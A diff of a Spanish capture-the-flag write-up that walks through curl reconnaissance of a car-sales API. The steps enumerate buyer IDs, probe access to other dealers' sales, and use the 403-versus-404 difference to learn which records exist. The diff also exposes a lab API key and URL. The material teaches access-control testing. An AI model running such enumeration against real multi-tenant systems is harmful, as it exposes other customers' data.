@@ -41,32 +41,109 @@ indirecta sobre él.
 
 ## Reconocimiento
 
-### El listado sí filtra por concesionaria
+### Paso 1 — Probar el listado por fecha
+
+Primer comando ejecutado contra la API, con la URL completa (todavía sin
+variables de entorno):
 
 ```bash
-curl -s "$BASE/api/ventas?fecha=2025-10-01" -H "X-API-Key: $TOKEN"
+curl -s "https://chl-08adbe3b-b415-464e-9103-8bb158158af5-venta-de-autos.softwareseguro.com.ar/api/ventas?fecha=2025-10-01" \
+  -H "X-API-Key: 55f53057-d320-4bec-8447-0ba940740595"
 ```
 
-Devuelve únicamente ventas con IDs que, a simple vista, **no son
-correlativos**: por ejemplo, salta de `100921` a `100926`, luego a
-`100938`, etc. Esos huecos numéricos son la primera pista: existen ventas
-con esos IDs intermedios, pero pertenecen a otras concesionarias y el
-endpoint las oculta.
+Devuelve 45 ventas, todas con `vendedor_id` entre 1 y 4 (la concesionaria
+propia tiene 4 vendedores) y `comprador_id` entre 1 y 16. Observación clave
+mirando los `id` de cada venta: **no son correlativos**. Por ejemplo, la
+lista salta de `id: 100921` a `id: 100926`, luego a `id: 100938`, etc. Esos
+huecos numéricos son la primera pista: existen ventas con esos IDs
+intermedios, pero pertenecen a otras concesionarias y el endpoint las
+oculta del listado.
 
-### El detalle por ID SÍ valida ownership
+De acá en adelante, para comodidad, se definieron variables de entorno:
+```bash
+TOKEN="55f53057-d320-4bec-8447-0ba940740595"
+BASE="https://chl-08adbe3b-b415-464e-9103-8bb158158af5-venta-de-autos.softwareseguro.com.ar"
+```
+
+### Paso 2 — Probar si el detalle por ID expone ventas ajenas directamente
+
+Se intentó acceder directo a uno de los IDs "faltantes" del listado
+(`100922`), con la hipótesis de que fuera un IDOR simple como en otros
+desafíos de la serie:
 
 ```bash
 curl -s "$BASE/api/venta/100922" -H "X-API-Key: $TOKEN"
 # {"error": "Forbidden"}
 ```
 
-A diferencia de otros desafíos de IDOR de la serie, acá el endpoint de
-detalle **no** es vulnerable de forma directa: devuelve `403 Forbidden`
-para ventas de otras concesionarias. Lo mismo ocurre con
-`/api/comprador/{id}` y `/api/vendedor/{id}` para IDs fuera del rango
-propio (en este caso, compradores con `id` 17 en adelante).
+A diferencia de otros desafíos de IDOR, acá el endpoint de detalle **sí**
+valida ownership: devuelve `403 Forbidden` para ventas ajenas. Esto
+descartó el camino más directo.
 
-### Un detalle crucial: 403 vs 404 son distinguibles
+### Paso 3 — Explorar compradores y vendedores en busca de otra vía
+
+Se probó si `/api/comprador/{id}` y `/api/vendedor/{id}` tenían la misma
+protección, revisando en bloque un rango de compradores:
+
+```bash
+for i in $(seq 1 30); do
+  echo "=== comprador $i ==="
+  curl -s "$BASE/api/comprador/$i" -H "X-API-Key: $TOKEN"
+  echo
+done
+```
+
+Resultado: compradores `1` a `16` responden `200` con datos reales
+(nombre, apellido, DNI); desde el `17` en adelante, `403 Forbidden`. Mismo
+patrón de aislamiento por concesionaria que en ventas — esta vía tampoco
+ofrecía una lectura directa de datos ajenos. Se revisaron también los
+nombres de los compradores/vendedores propios por si el compañero había
+"marcado" alguno de forma reconocible; ninguno se destacaba del resto.
+
+### Paso 4 — Sondear el comportamiento de los POST
+
+Se probó crear un comprador de prueba, para entender cómo se asignan los
+IDs:
+```bash
+curl -s -X POST "$BASE/api/comprador" -H "X-API-Key: $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"nombre":"Test","apellido":"Prueba","dni":"00000000"}'
+# {"id": 80, ...}
+```
+Con solo 16 compradores propios, el nuevo registro recibió `id: 80` —
+confirma que los IDs de comprador (y, por extensión, de venta) **se
+autoincrementan de forma global**, compartidos entre todas las
+concesionarias que usan el sistema, no por separado para cada una.
+
+Se intentó el mismo sondeo con una venta, en un primer intento sin todos
+los campos:
+```bash
+curl -s -X POST "$BASE/api/venta" -H "X-API-Key: $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"comprador_id":1,"vendedor_id":1,"marca":"Test","modelo":"Test","anio":2024,"precio":1000}'
+# {"error": "Missing required fields: vendedor_id, comprador_id, marca,
+#            modelo, anio, precio, fecha_venta, hora_venta"}
+```
+El mensaje de error reveló dos campos no evidentes hasta ese momento:
+`fecha_venta` y `hora_venta` son requeridos y **se pueden elegir
+libremente** al crear una venta. Repitiendo el POST con esos campos
+completos:
+```bash
+curl -s -X POST "$BASE/api/venta" -H "X-API-Key: $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"comprador_id":1,"vendedor_id":1,"marca":"Test","modelo":"Test",
+       "anio":2024,"precio":1000,"fecha_venta":"2025-10-01","hora_venta":"23:59:59"}'
+# {"id": 101092, ...}
+```
+El ID devuelto (`101092`) correspondió al contador global *del momento
+real de creación* (varios días después del 01/10), sin importar la fecha
+falsa indicada en `fecha_venta` — confirmando que no es posible
+"insertarse" en un rango de IDs ya pasado simulando una fecha antigua.
+
+### Paso 5 — Un detalle crucial: 403 vs 404 son distinguibles
+
+Buscando otra vía ya que no se podía leer el contenido de ventas ajenas,
+se probó qué pasaba con un ID que directamente no existiera en el sistema:
 
 ```bash
 curl -s -i "$BASE/api/venta/999999" -H "X-API-Key: $TOKEN"
@@ -82,36 +159,8 @@ rechazo:
 
 Esta distinción, aunque no filtra datos sensibles por sí sola, **sí filtra
 un bit de información**: si un recurso existe o no. Es la pieza clave que
-permite resolver el desafío sin necesidad de leer el contenido de las
-ventas ajenas.
-
-### Los IDs son correlativos y compartidos entre concesionarias
-
-Al crear un comprador de prueba:
-```bash
-curl -s -X POST "$BASE/api/comprador" -H "X-API-Key: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"nombre":"Test","apellido":"Prueba","dni":"00000000"}'
-# {"id": 80, ...}
-```
-
-Con solo 16 compradores propios, el nuevo registro recibió `id: 80` —
-confirma que los IDs de comprador (y, por extensión, de venta) **se
-autoincrementan de forma global**, compartidos entre todas las
-concesionarias que usan el sistema, no por separado para cada una.
-
-También se confirmó que `fecha_venta` es un campo **libre** al crear una
-venta (no se autogenera con la fecha del servidor):
-```bash
-curl -s -X POST "$BASE/api/venta" -H "X-API-Key: $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"comprador_id":1,"vendedor_id":1,"marca":"Test","modelo":"Test",
-       "anio":2024,"precio":1000,"fecha_venta":"2025-10-01","hora_venta":"23:59:59"}'
-# {"id": 101092, ...}
-```
-El ID devuelto (`101092`) correspondió al contador global *del momento
-real de creación*, sin importar la fecha falsa indicada — por lo que no es
-posible "insertarse" en un rango de IDs ya pasado.
+terminó permitiendo resolver el desafío sin necesidad de leer el contenido
+de las ventas ajenas.
 
 ## Estrategia de resolución
 
